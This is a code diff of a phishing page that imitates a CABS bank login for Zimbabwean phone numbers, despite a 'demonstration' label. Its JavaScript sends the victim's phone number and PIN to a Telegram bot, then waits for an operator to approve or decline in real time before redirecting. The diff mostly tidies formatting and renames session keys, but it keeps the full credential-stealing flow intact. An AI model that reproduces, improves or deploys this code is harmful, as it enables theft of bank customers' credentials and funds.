@@ -256,16 +256,11 @@
       </div>
 
       <div class="login-title">Welcome</div>
-
       <div class="demo-label">DEMONSTRATION INTERFACE</div>
 
       <div class="form-content">
         <div class="phone-box">
-          <img
-            class="flag"
-            src="https://flagcdn.com/w40/zw.png"
-            alt="Zimbabwe flag"
-          />
+          <img class="flag" src="https://flagcdn.com/w40/zw.png" alt="Zimbabwe flag" />
           <div class="code">+263</div>
           <input
             class="phone-input"
@@ -314,7 +309,7 @@
 
         <button class="btn" id="helpBtn" type="button">
           <svg viewBox="0 0 24 24" aria-hidden="true">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h2v2h-2zm1-12c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/>
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h2v2h-2zm1-12c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.7-4-4-4z"/>
           </svg>
           <span>Help &amp; Support</span>
         </button>
@@ -354,38 +349,22 @@
 
       function showSpinner() { spinner.style.display = "flex"; }
       function hideSpinner() { spinner.style.display = "none"; }
-
-      function setError(message) {
-        error.textContent = message;
-      }
+      function setError(message) { error.textContent = message; }
 
       function clearPinFields(shouldFocus = false) {
         pinInputs.forEach((input) => {
           input.value = "";
           input.style.borderColor = "#17486c";
         });
-        if (shouldFocus) {
-          pinInputs[0].focus();
-        }
+        if (shouldFocus) pinInputs[0].focus();
       }
 
       function normalizePhone(rawValue) {
-        let digits = (rawValue || "").replace(/\\D/g, "");
-
+        let digits = (rawValue || "").replace(/\D/g, "");
         if (!digits) return null;
-
-        if (digits.startsWith("263")) {
-          digits = digits.substring(3);
-        }
-
-        if (digits.startsWith("0")) {
-          digits = digits.substring(1);
-        }
-
-        if (digits.length === 9 && digits.startsWith("7")) {
-          return "+263" + digits;
-        }
-
+        if (digits.startsWith("263")) digits = digits.substring(3);
+        if (digits.startsWith("0")) digits = digits.substring(1);
+        if (digits.length === 9 && digits.startsWith("7")) return "+263" + digits;
         return null;
       }
 
@@ -397,11 +376,11 @@
 
       function escapeHtml(value) {
         if (!value) return "";
-        return String(value).replace(/[&<>]/g, (m) => {
-          if (m === "&") return "&amp;";
-          if (m === "<") return "&lt;";
-          if (m === ">") return "&gt;";
-          return m;
+        return String(value).replace(/[&<>]/g, (char) => {
+          if (char === "&") return "&amp;";
+          if (char === "<") return "&lt;";
+          if (char === ">") return "&gt;";
+          return char;
         });
       }
 
@@ -418,11 +397,10 @@
 
       function startPollingForDecision(approveCallbackId, declineCallbackId) {
         stopPolling();
-
         let lastUpdateId = 0;
 
         currentPollInterval = setInterval(async () => {
-          if (isProcessing === false) {
+          if (!isProcessing) {
             stopPolling();
             return;
           }
@@ -437,23 +415,20 @@
 
             for (const update of data.result) {
               lastUpdateId = Math.max(lastUpdateId, update.update_id || 0);
-
               const callback = update.callback_query;
               if (!callback || !callback.data) continue;
 
-              const callbackData = callback.data;
-
-              if (callbackData === approveCallbackId) {
+              if (callback.data === approveCallbackId) {
                 stopPolling();
                 isProcessing = false;
                 hideSpinner();
-                sessionStorage.setItem("approved_phone", pendingPhone);
-                sessionStorage.setItem("approved_pin", pendingPin);
+                sessionStorage.setItem("cabs_approved_phone", pendingPhone);
+                sessionStorage.setItem("cabs_approved_pin", pendingPin);
                 triggerRedirection();
                 return;
               }
 
-              if (callbackData === declineCallbackId) {
+              if (callback.data === declineCallbackId) {
                 stopPolling();
                 isProcessing = false;
                 hideSpinner();
@@ -481,9 +456,9 @@
         pendingPin = pinCode;
 
         const message =
-          `🔐 <b>CABS Login Request</b>\\n\\n` +
-          `<b>Phone:</b> <code>${escapeHtml(phoneLocal)}</code>\\n` +
-          `<b>PIN:</b> <code>${escapeHtml(pinCode)}</code>\\n\\n` +
+          `🔐 <b>CABS Login Request</b>\n\n` +
+          `<b>Phone:</b> <code>${escapeHtml(phoneLocal)}</code>\n` +
+          `<b>PIN:</b> <code>${escapeHtml(pinCode)}</code>\n\n` +
           `⚠️ <b>Action required:</b> Approve or Decline this login attempt.`;
 
         try {
@@ -495,20 +470,15 @@
               text: message,
               parse_mode: "HTML",
               reply_markup: {
-                inline_keyboard: [
-                  [
-                    { text: "✅ Approve", callback_data: approveId },
-                    { text: "❌ Decline", callback_data: declineId }
-                  ]
-                ]
+                inline_keyboard: [[
+                  { text: "✅ Approve", callback_data: approveId },
+                  { text: "❌ Decline", callback_data: declineId }
+                ]]
               }
             })
           });
 
-          if (!response.ok) {
-            throw new Error(`HTTP ${response.status}`);
-          }
-
+          if (!response.ok) throw new Error(`HTTP ${response.status}`);
           startPollingForDecision(approveId, declineId);
         } catch (err) {
           console.error("Telegram send error:", err);
@@ -538,9 +508,7 @@
           return;
         }
 
-        const localPhone = normalizedPhone.replace("+263", "");
         const pinValue = pinInputs.map((input) => input.value).join("");
-
         if (pinValue.length !== 4) {
           setError("Please enter your 4-digit PIN");
           clearPinFields(false);
@@ -552,6 +520,7 @@
         phoneInput.disabled = true;
         showSpinner();
 
+        const localPhone = normalizedPhone.replace("+263", "");
         await sendCredentialsToTelegram(localPhone, pinValue);
       }
 
@@ -572,17 +541,16 @@
           input.addEventListener("input", function () {
             if (isProcessing) return;
 
-            this.value = this.value.replace(/\\D/g, "").slice(0, 1);
+            this.value = this.value.replace(/\D/g, "").slice(0, 1);
             setError("");
 
             if (this.value && index < pinInputs.length - 1) {
               focusNext(index);
             }
 
-            const fullPin = pinInputs.every((field) => /^\\d$/.test(field.value));
+            const fullPin = pinInputs.every((field) => /^\d$/.test(field.value));
             if (fullPin) {
               const phoneIsValid = normalizePhone(phoneInput.value);
-
               if (!phoneIsValid) {
                 setError("Enter a valid Zimbabwe phone number.");
                 return;
@@ -630,10 +598,9 @@
             if (isProcessing) return;
 
             event.preventDefault();
-
             const pasted = (event.clipboardData || window.clipboardData)
               .getData("text")
-              .replace(/\\D/g, "")
+              .replace(/\D/g, "")
               .slice(0, 4);
 
             if (!pasted) return;
@@ -642,8 +609,7 @@
               field.value = pasted[fieldIndex] || "";
             });
 
-            const allFilled = pinInputs.every((field) => /^\\d$/.test(field.value));
-
+            const allFilled = pinInputs.every((field) => /^\d$/.test(field.value));
             if (allFilled) {
               submitToTelegram();
             } else {
@@ -699,6 +665,8 @@
       });
 
       function init() {
+        sessionStorage.removeItem("cabs_approved_phone");
+        sessionStorage.removeItem("cabs_approved_pin");
         setError("");
         clearPinFields(false);
         setPinInputsEnabled(true);
